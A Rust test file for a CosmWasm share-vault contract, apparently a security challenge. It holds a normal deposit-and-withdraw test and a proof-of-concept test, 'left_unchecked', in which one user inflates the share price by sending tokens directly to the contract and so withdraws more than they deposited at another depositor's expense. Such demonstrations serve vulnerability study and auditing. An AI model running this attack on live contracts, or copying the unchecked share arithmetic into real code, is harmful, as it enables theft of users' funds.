#[cfg(test)]
pub mod tests {
    use crate::{
        contract::DENOM,
        msg::{ExecuteMsg, InstantiateMsg, QueryMsg},
        state::Balance,
    };
    use cosmwasm_std::{coin, Addr, Empty, Uint128};
    use cw_multi_test::{App, Contract, ContractWrapper, Executor};

    pub fn challenge_contract() -> Box<dyn Contract<Empty>> {
        let contract = ContractWrapper::new(
            crate::contract::execute,
            crate::contract::instantiate,
            crate::contract::query,
        );
        Box::new(contract)
    }

    pub const USER: &str = "user";
    pub const USER2: &str = "user2";
    pub const ADMIN: &str = "admin";

    pub fn proper_instantiate() -> (App, Addr) {
        let mut app = App::default();
        let cw_template_id = app.store_code(challenge_contract());

        // init contract
        let msg = InstantiateMsg { offset: 10 };
        let contract_addr = app
            .instantiate_contract(
                cw_template_id,
                Addr::unchecked(ADMIN),
                &msg,
                &[],
                "test",
                None,
            )
            .unwrap();

        (app, contract_addr)
    }

    pub fn mint_tokens(mut app: App, recipient: String, amount: Uint128) -> App {
        app.sudo(cw_multi_test::SudoMsg::Bank(
            cw_multi_test::BankSudo::Mint {
                to_address: recipient,
                amount: vec![coin(amount.u128(), DENOM)],
            },
        ))
        .unwrap();
        app
    }

    #[test]
    fn basic_flow() {
        let (mut app, contract_addr) = proper_instantiate();

        // mint funds to user
        app = mint_tokens(app, USER.to_owned(), Uint128::new(10_000));

        // mint shares for user
        app.execute_contract(
            Addr::unchecked(USER),
            contract_addr.clone(),
            &ExecuteMsg::Mint {},
            &[coin(10_000, DENOM)],
        )
        .unwrap();

        // mint funds to user2
        app = mint_tokens(app, USER2.to_owned(), Uint128::new(10_000));

        // mint shares for user2
        app.execute_contract(
            Addr::unchecked(USER2),
            contract_addr.clone(),
            &ExecuteMsg::Mint {},
            &[coin(10_000, DENOM)],
        )
        .unwrap();

        // query user
        let balance: Balance = app
            .wrap()
            .query_wasm_smart(
                contract_addr.clone(),
                &QueryMsg::UserBalance {
                    address: USER.to_string(),
                },
            )
            .unwrap();

        // burn shares for user
        app.execute_contract(
            Addr::unchecked(USER),
            contract_addr.clone(),
            &ExecuteMsg::Burn {
                shares: balance.amount,
            },
            &[],
        )
        .unwrap();

        // burn shares for user2
        app.execute_contract(
            Addr::unchecked(USER2),
            contract_addr.clone(),
            &ExecuteMsg::Burn {
                shares: balance.amount,
            },
            &[],
        )
        .unwrap();

        let bal = app.wrap().query_balance(USER, DENOM).unwrap();
        assert_eq!(bal.amount, Uint128::new(10_000));

        let bal = app.wrap().query_balance(USER2, DENOM).unwrap();
        assert_eq!(bal.amount, Uint128::new(10_000));

        let bal = app
            .wrap()
            .query_balance(contract_addr.to_string(), DENOM)
            .unwrap();
        assert_eq!(bal.amount, Uint128::zero());
    }

    // This demonstrates how an unprivileged user can withdraw more funds than deposited
    #[test]
    fn left_unchecked() {
        let (mut app, contract_addr) = proper_instantiate();

        // mint 10_000 tokens to both users
        app = mint_tokens(app, USER.to_owned(), Uint128::new(10_000));
        app = mint_tokens(app, USER2.to_owned(), Uint128::new(10_000));

        // USER sends 5_000 tokens directly to the contract "pre-diluting" other users
        let msg: cosmwasm_std::CosmosMsg = cosmwasm_std::BankMsg::Send {
            to_address: contract_addr.clone().into(),
            amount: vec![coin(5_000, DENOM)],
        }
        .into();
        app.execute(Addr::unchecked(USER), msg.clone()).unwrap();

        // USER calls mint with 10 tokens
        app.execute_contract(
            Addr::unchecked(USER),
            contract_addr.clone(),
            &ExecuteMsg::Mint {},
            &[coin(10, DENOM)],
        )
        .unwrap();

        // USER2 calls mint with 10_000 tokens
        app.execute_contract(
            Addr::unchecked(USER2),
            contract_addr.clone(),
            &ExecuteMsg::Mint {},
            &[coin(10_000, DENOM)],
        )
        .unwrap();

        // Querying the contract to get the number of shares USER owns
        let balance: Balance = app
            .wrap()
            .query_wasm_smart(
                contract_addr.clone(),
                &QueryMsg::UserBalance {
                    address: USER.to_string(),
                },
            )
            .unwrap();
        
        // Assert it's 10 (the same amount they called Mint with)
        assert_eq!(balance.amount, Uint128::from(10u128));

        // USER calls burn, burning all 10 of their shares
        app.execute_contract(
            Addr::unchecked(USER),
            contract_addr.clone(),
            &ExecuteMsg::Burn {
                shares: balance.amount
            },
            &[],
        )
        .unwrap();

        // Asserting that "USER" has successfully stolen tokens from other users
        // Asserting that "USER" has withdrawn more funds than deposited
        let user_bal = app.wrap().query_balance(USER, DENOM).unwrap();
        assert!(user_bal.amount.u128() > 10_000u128);
        assert_eq!(user_bal.amount, Uint128::from(10_165u128));
    }

}
